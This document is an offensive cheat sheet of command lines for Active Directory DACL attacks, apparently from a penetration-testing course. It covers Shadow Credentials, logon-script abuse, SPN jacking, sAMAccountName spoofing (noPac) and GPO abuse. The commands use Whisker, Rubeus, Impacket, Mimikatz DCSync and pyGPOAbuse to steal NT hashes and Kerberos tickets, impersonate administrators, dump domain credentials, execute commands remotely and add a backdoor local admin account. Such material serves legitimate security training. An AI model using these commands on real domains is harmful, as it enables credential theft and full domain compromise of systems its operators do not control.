title: DACL Attacks II
html:
DACL Attacks II

Shadow Credentials

Connect to RDP with xfreerdp

xfreerdp /u:<USER> /p:<PASSWORD> /d:<DOMAIN> /v:<IP> /dynamic-resolution /drive:.,linux

Use PowerView to query for users with msDS-KeyCredentialLink attribute not empty

Get-DomainUser -Filter '(msDS-KeyCredentialLink=*)'

List Key Credential attribute with Whisker

.\Whisker.exe list /target:<TARGET>

Add key credentials with Whisker

.\Whisker.exe add /target:<TARGET>

Retrieve TGT and NTLM hash with Rubeus

.\Rubeus.exe asktgt /user:<USER> /certificate:<CERTIFICATE> /password:"<PASSWORD>" /domain:<DOMAIN> /dc:<DC> /getcredentials /show

Create sacrificial logon session with Rubeus

.\Rubeus.exe createnetonly /program:powershell.exe /show

Pass the ticket using Gabriel's TGT with Rubeus

.\Rubeus.exe ptt /ticket:<BASE64>

Remove specific key credential value with Whisker

.\Whisker.exe remove /target:<TARGET> /deviceid:<DEVICEID>

Clear all key credentials with Whisker

.\Whisker.exe clear /target:<TARGET>

Get the ACEs of a user with PowerView

Get-DomainObjectAcl -Identity <TARGET>

Get the ACEs of a user with dacledit

python3 examples/dacledit.py -principal <USER> -target <TARGET> -dc-ip <DC_IP> <DOMAIN>'/'<USER>':'<PASSWORD>'

Add key credentials from Linux with pyWhisker

python3 pywhisker.py -d <DOMAIN> -u <USER> -p <PASSWORD> --target <TARGET> --action add

Use gettgtpkinit.py to generate TGT

python3 gettgtpkinit.py -cert-pfx <CERTIFICATE> -pfx-pass <PASSWORD> <DOMAIN>/<USER> <CCACHE_FILE>

Extract NT hash with getnthash.py

KRB5CCNAME=<CCACHE_FILE> python3 getnthash.py -key <KEY> <DOMAIN>/<USER>

Connect to a shared folder using TGT with smbclient

KRB5CCNAME=<CCACHE_FILE> smbclient.py -k -no-pass <DC>

Logon Scripts

Set scriptPath with bloodyAD

bloodyAD --host "<DC_IP>" -d "<DOMAIN>" -u "<USER>" -p '<PASSWORD>' set object <TARGET_USER> scriptPath -v '<PATH>'

Get scriptPath with bloodyAD

bloodyAD --host "<DC_IP>" -d "<DOMAIN>" -u "<USER>" -p '<PASSWORD>' get object <TARGET_USER> --attr scriptPath

Display ACLs on an NT file or directory name with smbcacls

smbcacls //<DC_IP>/NETLOGON <DIR> -U <USER>%'PASSWORD'

Get the ACEs of <USER> over <TARGET_USER> with PywerView

pywerview get-objectacl --name '<TARGET_USER>' -w <DOMAIN> -t <DC_IP> -u '<USER>' -p '<PASSWORD>' --resolve-sids --resolve-guids

Get the ACEs of <USER> over <TARGET_USER> with dacledit

python3 examples/dacledit.py -principal '<USER>' -target '<TARGET_USER>' -dc-ip <DC_IP> <DOMAIN>'/'<USER>':'<PASSWORD>'

Collect data from AD with Adalanche

./adalanche-linux-x64-v<VERSION> collect activedirectory --domain <DOMAIN> --server <DC_IP>  --username '<USER>' --password '<PASSWORD>'

Launch interactive discovery tool with Adalanche

./adalanche-linux-x64-v<VERSION> analyze --datapath <DATAPATH>

Modify scriptPath with PowerView

Set-DomainObject <TARGET_USER> -Set @{'scriptPath'='<PATH>'}

Get scriptPath with PowerView

Get-DomainObject <TARGET_USER> -Properties scriptPath

List available folders within NETLOGON with PowerShell

ls $env:LOGONSERVER\NETLOGON

Determine permissions on a folder within NETLOGON with icacls

icacls $env:LOGONSERVER\NETLOGON\<DIR>

Run ScriptSentry to discover misconfigurations in logon scripts

.\Invoke-ScriptSentry.ps1

SPN Jacking

Connect to RDP with xfreerdp

xfreerdp /u:<USER> /p:<PASSWORD> /d:<DOMAIN> /v:<IP> /dynamic-resolution /drive:.,linux

Cypher query to list WriteSPN rights in BloodHound

MATCH p=(n:User)-[r1:WriteSPN*1..]->(c:Computer) RETURN p

PowerView command to list WriteSPN permissions for a user

Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $(ConvertTo-SID <USER>)}

PowerView command to list computers with constrained delegation

Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto

List orphaned SPNs with Get-ConstrainedDelegation.ps1

Get-ConstrainedDelegation -CheckOrphaned

PowerView command to assign an orphaned SPN to a target machine

Set-DomainObject -Identity <TARGET> -Set @{serviceprincipalname='<SPN>'} -Verbose

Execute S4U attack to forge a ticket as Administrator to the target machine

.\Rubeus.exe s4u /domain:<DOMAIN> /user:<USER> /rc4:<HASH> /impersonateuser:<ADMIN> /msdsspn:"<SPN>" /nowrap

Rubeus command to alter the service name and hostname of a ticket

.\Rubeus.exe tgssub /ticket:<BASE64> /altservice:<SERVICE>

Clear an SPN from a target machine with PowerView

Set-DomainObject -Identity <TARGET> -Clear 'serviceprincipalname' -Verbose

List servers configured for Constrained Delegation with Get-ConstrainedDelegation.ps1

Get-ConstrainedDelegation

Add a specific SPN to a target machine with PowerView

Set-DomainObject -Identity <TARGET> -Set @{serviceprincipalname='<SPN>'} -Verbose

Perform a pass-the-ticket attack using Rubeus

.\Rubeus.exe ptt /ticket:<BASE64>

Find constrained delegation rights using proxychains and findDelegation.py from Impacket

proxychains4 -q findDelegation.py -target-domain <DOMAIN> -dc-ip <DC_IP> -dc-host <DC_HOST> <DOMAIN>/<USER>:<PASSWORD>

Clear SPN from a target machine using proxychains and addspn.py

proxychains4 -q python3 addspn.py <DC_IP> -u '<DOMAIN>/<USER>' -p <PASSWORD> --clear -t '<TARGET>'

Impersonate a user and request a service ticket with proxychains and getST.py

proxychains4 -q getST.py -spn '<SPN>' -impersonate <USER> '<DOMAIN>/<ACCOUNT>' -hashes :<HASH> -dc-ip <DC_IP>

Modify a ticket's service name using proxychains and tgssub.py

proxychains4 -q python3 tgssub.py -in <TICKET_FILE> -altservice "<SERVICE>" -out <NEW_TICKET_FILE>

Describe a ticket using describeTicket.py from Impacket

describeTicket.py <TICKET_FILE>

Execute a command on a remote machine using a ticket with smbexec.py from Impacket

KRB5CCNAME=<TICKET_FILE> smbexec.py -k -no-pass <TARGET>

Impersonate a user, request a service ticket, and change its attributes in one command using proxychains and getST.py

proxychains4 -q getST.py -spn '<SPN>' -impersonate <USER> '<DOMAIN>/<ACCOUNT>' -hashes :<HASH> -dc-ip <DC_IP> -altservice "<SERVICE>"

Restore SPNs using a for loop and addspn.py

for spn in $(cat <SPN_FILE>);do proxychains4 -q python3 addspn.py <DC_IP> -u '<DOMAIN>/<USER>' -p <PASSWORD> -t '<TARGET>' --spn $spn;done

sAMAccountName Spoofing

Connect to RDP with xfreerdp

xfreerdp /u:<USER> /p:<PASSWORD> /d:<DOMAIN> /v:<IP> /dynamic-resolution /drive:.,linux

Scan for NoPAC vulnerability with noPac on Windows

.\noPac.exe scan -domain <DOMAIN> -user <USER> -pass <PASSWORD>

PowerView command to query ms-DS-MachineAccountQuota attribute

(Get-DomainObject -SearchScope Base)."ms-ds-machineaccountquota"

PowerView command to list machines created by specific users

Get-DomainComputer -Filter '(ms-DS-CreatorSID=*)' -Properties name,ms-ds-creatorsid

PowerMad command to create a machine account

New-MachineAccount -MachineAccount "<ACCOUNT>" -Password $password -Domain <DOMAIN> -DomainController <DC_IP>

PowerView command to clear SPNs from a machine account

Set-DomainObject -Identity '<ACCOUNT>$' -Clear 'serviceprincipalname' -Domain <DOMAIN> -DomainController <DC_IP>

PowerMad command to change sAMAccountName attribute

Set-MachineAccountAttribute -MachineAccount "<ACCOUNT>" -Value "<VALUE>" -Attribute samaccountname -Domain <DOMAIN> -DomainController <DC_IP>

Rubeus command to request a TGT as a machine account

.\Rubeus.exe asktgt /user:<USER> /password:<PASSWORD> /domain:<DOMAIN> /dc:<DC_IP> /nowrap

Rubeus command to obtain a service ticket with S4U2self

.\Rubeus.exe s4u /self /impersonateuser:<USER> /altservice:"<SERVICE>" /dc:<DC_IP> /ptt /ticket:<TICKET>

Mimikatz command to perform a DCSync attack

.\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /kdc:<DC_HOST> /user:<USER>" exit

NoPac command to scan for vulnerability from Linux

python3 noPac/scanner.py -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD> -use-ldap

BloodyAD command to get information about an account

python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> get object <ACCOUNT>

BloodyAD command to clear or set an attribute of an account

python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> set object <ACCOUNT> <ATTRIBUTE>

Impacket command to request a TGT

getTGT.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>

Impacket command to request a S4U2self service ticket

KRB5CCNAME=<TICKET_FILE> getST.py <DOMAIN>/<USER> -self -impersonate <USER> -altservice <SERVICE> -k -no-pass -dc-ip <DC_IP>

Impacket command to execute commands on a remote machine using a service ticket

KRB5CCNAME=<TICKET_FILE> psexec.py <DC_HOST> -k -no-pass

GPO Attacks

Convert a username to SID with PowerView

$userSID = ConvertTo-SID <NAME>

Retrieve all GPOs created in the current domain

Get-DomainGPO

Search which GPOs are applied to the Domain

Get-DomainObject -SearchScope Base -Properties gplink

Get the Active Directory rights affecting the GPO

Get-DomainObjectAcl -ResolveGUIDs

Convert the SecurityIdentifier to the group name

ConvertFrom-SID S-1-5-21-831407601-1803900599-2479021482-1604

Get group membership

Get-DomainGroupMember "<NAME>"

Get gplink on OU

Get-DomainOU | select name, gplink

List computers within each OU

Get-DomainOU | foreach { $ou = $_.distinguishedname; Get-DomainComputer -SearchBase $ou -Properties dnshostname | select @{Name='OU';Expression={$ou}}, @{Name='FQDN';Expression={$_.dnshostname}} }

Create a New GPO

New-GPO -Name TestGPO -Comment "This is a test GPO."

Link a GPO to an OU

New-GPLink -Name TestGPO -Target "OU=TestOU,DC=<domain-name>,DC=local"

Get GPOs where users have modification rights

Get-GPOEnumeration

Abusing GPOs rights with SharpGPOAbuse

SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <NAME> --GPOName "Default Security Policy - WKS"

List GPOs with GPOwned

proxychains4 -q python3 GPOwned.py -u <NAME> -p <PASSWORD> -d <domain> -dc-ip 172.16.92.10 -gpcmachine -listgpo

List GPO Links with GPOwned

proxychains4 -q python3 GPOwned.py -u <NAME> -p <PASSWORD> -d <domain> -dc-ip 172.16.92.10 -gpcmachine -listgplink

Query GPO rights with DACLEdit

proxychains4 -q python3 examples/dacledit.py <domain>/<NAME>:<PASSWORD> -target-dn "CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=<domain-name>,DC=local" -dc-ip 172.16.92.10

Backup GPO with GPOwned

proxychains4 -q python3 GPOwned.py -u <NAME> -p <PASSWORD> -d <domain> -dc-ip 172.16.92.10 -gpcmachine -backup backupgpo -name "{31B2F340-016D-11D2-945F-00C04FB984F9}"

Abusing GPOs with pyGPOAbuse

proxychains4 -q python3 pygpoabuse.py <domain>/<NAME>:<PASSWORD> -gpo-id EF1EBF2A-08F2-48E0-9D2E-67D9F2CE875D -command "net user plaintext Password1234 /add && net localgroup Administrators plaintext /add" -taskname "PT_LocalAdmin" -description "this is a GPO test" -dc-ip 172.16.92.10 -v
